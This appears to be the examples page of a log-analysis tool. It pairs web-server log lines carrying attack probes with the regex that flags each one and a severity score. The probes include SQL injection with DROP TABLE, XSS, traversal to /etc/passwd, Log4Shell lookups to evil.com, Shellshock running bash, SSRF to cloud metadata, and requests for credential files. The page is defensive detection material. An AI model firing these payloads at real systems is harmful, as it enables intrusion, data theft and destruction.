# Examples

Real attack examples with the pattern that catches them.

Each example shows:

1. The log line
2. The category it triggers
3. The severity weight added to the IP score

---

## Table of Contents

- [SQL Injection](#sql-injection-critical-weight-10)
- [XSS](#xss-high-weight-7)
- [Path Traversal](#path-traversal-high-weight-7)
- [Log4Shell](#log4shell-critical-weight-10)
- [Shellshock](#shellshock-critical-weight-10)
- [SSRF](#ssrf-high-weight-7)
- [RFI](#rfi-critical-weight-10)
- [SSTI](#ssti-high-weight-7)
- [NoSQL Injection](#nosql-injection-high-weight-7)
- [Sensitive Files](#sensitive-files-medium-weight-4)
- [Scanner User-Agents](#scanner-user-agents-info-weight-1)
- [Combined Attacks](#combined-attacks)
- [Clean Log](#clean-log-no-attacks)
- [IPv6 Client](#ipv6-client)
- [Basic Auth](#basic-auth-authuser-field)
- [Apache Zero-Byte Response](#apache-zero-byte-response)

---

## SQL Injection (CRITICAL, weight 10)

### Payload 1 — Classic OR 1=1

```
10.0.0.1 - - [ts] "GET /?id=1'%20OR%20'1'='1 HTTP/1.1" 200 500 "-" "Mozilla/5.0"
```

**Matches:**

```
'[[:space:]]*OR[[:space:]]*'?1'?[[:space:]]*=[[:space:]]*'?1
```

After URL decode: `/?id=1' OR '1'='1` — the classic boolean-based SQLi probe.

**Score:** `+10`

### Payload 2 — UNION SELECT

```
10.0.0.1 - - [ts] "GET /?q=UNION%20SELECT%20username%20FROM%20users HTTP/1.1" 200 500 "-" "sqlmap/1.7"
```

**Matches:**

```
UNION[[:space:]]+(ALL[[:space:]]+)?SELECT
```

Also triggers `Scanner/Bot` (INFO, +1) because UA is `sqlmap/1.7`.

**Score:** `+10 (SQLi) +1 (Scanner) = +11`

### Payload 3 — Time-based blind

```
10.0.0.1 - - [ts] "GET /?id=1'%20AND%20SLEEP(5)-- HTTP/1.1" 200 500 "-" "sqlmap/1.7"
```

**Matches:**

```
\bSLEEP[[:space:]]*\(
```

**Score:** `+11`

### Payload 4 — Stacked queries

```
10.0.0.1 - - [ts] "GET /?id=1;%20DROP%20TABLE%20users-- HTTP/1.1" 200 0 "-" "sqlmap/1.7"
```

**Matches:**

```
;[[:space:]]*DROP[[:space:]]+TABLE
```

**Score:** `+11`

---

## XSS (HIGH, weight 7)

### Payload 1 — Script tag

```
10.0.0.2 - - [ts] "GET /?q=<script>alert(1)</script> HTTP/1.1" 200 300 "-" "Mozilla/5.0"
```

**Matches:**

```
<script[^>]*>
```

**Score:** `+7`

### Payload 2 — SVG with onload

```
10.0.0.2 - - [ts] "GET /?name=<svg%20onload=alert(1)> HTTP/1.1" 200 300 "-" "Mozilla/5.0"
```

After decode: `<svg onload=alert(1)>`

**Matches:**

```
<svg[^>]*onload
```

**Score:** `+7`

### Payload 3 — javascript: URI

```
10.0.0.2 - - [ts] "GET /?url=javascript:alert(document.cookie) HTTP/1.1" 200 300 "-" "Mozilla/5.0"
```

**Matches:**

```
javascript:[[:space:]]*
```

Also matches `document\.cookie`.

**Score:** `+7` (XSS counted once, not per pattern)

---

## Path Traversal (HIGH, weight 7)

### Payload 1 — Classic `../`

```
10.0.0.3 - - [ts] "GET /../../../etc/passwd HTTP/1.1" 404 0 "-" "Mozilla/5.0"
```

**Matches:**

```
\.\./        (two or more ../)
/etc/passwd
```

**Score:** `+7`

### Payload 2 — URL-encoded

```
10.0.0.3 - - [ts] "GET /%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 400 0 "-" "Mozilla/5.0"
```

After decode: `/../../etc/passwd`

**Matches:**

```
%2[eE]%2[eE]%2[fF]   (encoded ../)
/etc/passwd
```

**Score:** `+7`

### Payload 3 — Windows target

```
10.0.0.3 - - [ts] "GET /?file=../../../../windows/win.ini HTTP/1.1" 404 0 "-" "Mozilla/5.0"
```

**Matches:**

```
\.\./
windows/win\.ini
```

**Score:** `+7`

---

## Log4Shell (CRITICAL, weight 10)

### Payload 1 — JNDI lookup (CVE-2021-44228)

```
10.0.0.4 - - [ts] "GET /?x=${jndi:ldap://evil.com/x} HTTP/1.1" 500 0 "-" "Mozilla/5.0"
```

**Matches:**

```
\$\{jndi:
```

**Does NOT match SSTI** — the `${...}` is recognized as Log4Shell first
(weight 10), so SSTI is skipped. Without this fix, IP would be scored 17
(10 + 7) for a single payload.

**Score:** `+10`

### Payload 2 — Env var exfiltration

```
10.0.0.4 - - [ts] "GET /?user=${env:SECRET} HTTP/1.1" 200 0 "-" "Mozilla/5.0"
```

**Matches:**

```
\$\{env:
```

**Score:** `+10`

### Payload 3 — Same payload in User-Agent

```
10.0.0.4 - - [ts] "GET / HTTP/1.1" 200 100 "-" "${jndi:ldap://evil.com/x}"
```

Log4Shell matches the **UA** field too — not just the path.

**Score:** `+10`

---

## Shellshock (CRITICAL, weight 10)

### Payload 1 — Classic (CVE-2014-6271)

```
10.0.0.5 - - [ts] "GET / HTTP/1.1" 200 100 "-" "() { :; }; /bin/bash -c id"
```

**Matches:**

```
\(\)[[:space:]]*\{[[:space:]]*[^}]*;
```

Matches the pattern `() { ...;` — the Shellshock signature.

**Score:** `+10`

### Payload 2 — Variant

```
10.0.0.5 - - [ts] "GET / HTTP/1.1" 200 100 "-" "() { _; } >_[$($())] { echo vuln; }"
```

**Matches:**

```
\(\)[[:space:]]*\{[[:space:]]*[^}]*;
```

Matches `() { _; }` — the pattern isn't tied to `:;` specifically.

**Score:** `+10`

---

## SSRF (HIGH, weight 7)

### Payload 1 — Localhost

```
10.0.0.6 - - [ts] "GET /?url=http://127.0.0.1/admin HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

**Matches:**

```
(=|%3[Dd])(http://)?(127\.0\.0\.1|localhost|0\.0\.0\.0)
```

Also matches `RFI` (weight 10) because the pattern `(=|%3[Dd])http://` is
also in `RFI_PATTERNS`.

**Score:** `+7 (SSRF) +10 (RFI) = +17`

**False positive note:** `/blog/localhost-guide` does NOT match — the
pattern requires `=` before the URL.

### Payload 2 — Cloud metadata

```
10.0.0.6 - - [ts] "GET /?fetch=http://169.254.169.254/latest HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

**Matches:**

```
(=|%3[Dd])http://169\.254\.169\.254
```

AWS/GCP/Azure metadata endpoint.

**Score:** `+7 (SSRF) +10 (RFI) = +17`

### Payload 3 — File:// and gopher://

```
10.0.0.6 - - [ts] "GET /?url=file:///etc/passwd HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

**Matches:**

```
(=|%3[Dd])file://
```

**Score:** `+7 (SSRF) +7 (Path Traversal — /etc/passwd) = +14`

---

## RFI (CRITICAL, weight 10)

### Payload 1 — php://input

```
10.0.0.7 - - [ts] "GET /?file=php://input HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

**Matches:**

```
php://input
```

**Score:** `+10`

### Payload 2 — php://filter

```
10.0.0.7 - - [ts] "GET /?page=php://filter/convert.base64-encode/resource=index HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

**Matches:**

```
php://filter
```

**Score:** `+10`

### Payload 3 — data:// wrapper

```
10.0.0.7 - - [ts] "GET /?include=data://text/plain;base64,PD9waHA= HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

**Matches:**

```
data://text
```

**Score:** `+10`

---

## SSTI (HIGH, weight 7)

### Payload 1 — Jinja2

```
10.0.0.8 - - [ts] "GET /?name={{7*7}} HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

**Matches:**

```
\{\{[^}]*\}\}
```

**Score:** `+7`

### Payload 2 — Spring Expression

```
10.0.0.8 - - [ts] "GET /?t=${7*7} HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

**Matches:**

```
\$\{[^}]*\}
```

**Note:** `${env:...}` matches Log4Shell (weight 10) first, so it's not
double-counted as SSTI. But `${7*7}` has no Log4Shell prefix, so it
correctly triggers SSTI.

**Score:** `+7`

### Payload 3 — Twig

```
10.0.0.8 - - [ts] "GET /?q={%for%20x%20in%20range(10)%} HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

After decode: `{%for x in range(10)%}`

**Matches:**

```
\{%[^%]*%\}
```

**Score:** `+7`

---

## NoSQL Injection (HIGH, weight 7)

### Payload 1 — $ne (not equal) operator

```
10.0.0.9 - - [ts] "GET /?user[$ne]=null HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

**Matches:**

```
\[\$ne\]
```

The `[` bracket form is specific to NoSQL query injection.

**Score:** `+7`

### Payload 2 — $gt (greater than)

```
10.0.0.9 - - [ts] "GET /?pw[$gt]= HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

**Matches:**

```
\$gt\b
```

`$gt` bypasses authentication by making the password comparison
always true.

**Score:** `+7`

### Payload 3 — $where (JS execution)

```
10.0.0.9 - - [ts] "GET /?f={\"\$where\":\"1\"} HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

**Matches:**

```
\$where\b
```

**Score:** `+7`

---

## Sensitive Files (MEDIUM, weight 4)

### Payload 1 — .env (secrets)

```
10.0.0.12 - - [ts] "GET /.env HTTP/1.1" 404 0 "-" "Mozilla/5.0"
```

**Matches:**

```
/\.env
```

**No false positive on `/.environment`** — the pattern uses path-boundary
anchors to avoid matching unrelated paths.

**Score:** `+4`

### Payload 2 — .git (source code)

```
10.0.0.12 - - [ts] "GET /.git/config HTTP/1.1" 403 0 "-" "Mozilla/5.0"
```

**Matches:**

```
/\.git/
```

**Score:** `+4`

### Payload 3 — AWS credentials

```
10.0.0.12 - - [ts] "GET /.aws/credentials HTTP/1.1" 404 0 "-" "Mozilla/5.0"
```

**Matches:**

```
/\.aws/credentials
```

**Score:** `+4`

### Payload 4 — wp-config.php (WordPress)

```
10.0.0.12 - - [ts] "GET /wp-config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
```

**Matches:**

```
/wp-config\.php
```

**Score:** `+4`

---

## Scanner User-Agents (INFO, weight 1)

### Payload 1 — sqlmap

```
10.0.0.13 - - [ts] "GET / HTTP/1.1" 200 0 "-" "sqlmap/1.7.2#stable"
```

**Matches:**

```
(^|[^[:alnum:]])sqlmap([^[:alnum:]]|$)
```

The word-boundary anchors avoid matching `unsqlmap` or `sqlmapper`.

**Score:** `+1`

### Payload 2 — Nikto

```
10.0.0.13 - - [ts] "GET / HTTP/1.1" 200 0 "-" "Nikto/2.1.6"
```

**Matches (case-insensitive):**

```
(^|[^[:alnum:]])nikto([^[:alnum:]]|$)
```

**Score:** `+1`

### Payload 3 — OWASP ZAP

```
10.0.0.13 - - [ts] "GET / HTTP/1.1" 200 0 "-" "OWASP ZAP/2.12"
```

**Matches:**

```
(^|[^[:alnum:]])zap([^[:alnum:]]|$)
```

**No false positive on "Zapier"** — the pattern requires word boundaries.

**Score:** `+1`

### Payload 4 — Burp Suite

```
10.0.0.13 - - [ts] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 Burp Suite Professional"
```

**Matches (case-insensitive):**

```
(^|[^[:alnum:]])Burp[ _-]?Suite([^[:alnum:]]|$)
```

Handles `Burp Suite`, `BurpSuite`, `Burp_Suite`, `Burp-Suite`.

**Score:** `+1`

---

## Combined Attacks

A single line can trigger multiple categories.

```
10.0.0.6 - - [ts] "GET /?url=http://127.0.0.1/admin?id=1'OR'1'='1 HTTP/1.1" 200 100 "-" "sqlmap/1.7"
```

Triggers:

- **SSRF** (weight 7) — `?url=http://127.0.0.1`
- **RFI** (weight 10) — `=http://` pattern
- **SQLi** (weight 10) — `'OR'1'='1`
- **Scanner** (weight 1) — `sqlmap` in UA

**IP score:** `7 + 10 + 10 + 1 = 28`

Not enough to reach CRITICAL (30). Two more probes from the same IP would
push it over.

---

## Clean Log (No Attacks)

```
192.168.1.1 - - [10/Oct/2024:13:55:36 -0700] "GET /index.html HTTP/1.1" 200 2326 "-" "Mozilla/5.0"
192.168.1.2 - - [10/Oct/2024:13:55:37 -0700] "GET /api/v1/users HTTP/1.1" 200 500 "-" "curl/8.4.0"
192.168.1.3 - - [10/Oct/2024:13:55:38 -0700] "POST /login HTTP/1.1" 302 0 "-" "Mozilla/5.0"
```

**Security Analysis:** No attacks detected

**Exit code:** `0`

---

## IPv6 Client

```
2001:db8:85a3::8a2e:370:7334 - - [10/Oct/2024:13:55:40 -0700] "GET / HTTP/1.1" 200 100 "-" "Mozilla/5.0"
```

IPv6 addresses (compressed, full, or IPv4-mapped) are parsed and analyzed
identically to IPv4. The report uses a 40-character column for IP display,
which fits the longest possible IPv6
(`2001:0db8:85a3:0000:0000:8a2e:0370:7334`, 39 chars).

---

## Basic Auth (authuser field)

```
192.168.1.5 - admin [10/Oct/2024:13:55:41 -0700] "GET /admin HTTP/1.1" 200 800 "-" "Mozilla/5.0"
```

The `admin` in the third field is `$remote_user` — captured by the parser
as `LOG_AUTHUSER`. In v1.0.0 this is reserved (not used in detection);
planned for v2 (credential stuffing / brute-force detection).

---

## Apache Zero-Byte Response

```
192.168.1.4 - - [10/Oct/2024:13:55:39 -0700] "HEAD / HTTP/1.1" 304 - "-" "curl/7.81"
```

Note the `304 -` — Apache writes `-` for zero-byte responses
(204, 304, HEAD). Nginx writes `0`.

The parser accepts both — no regression for Nginx logs, works for Apache.
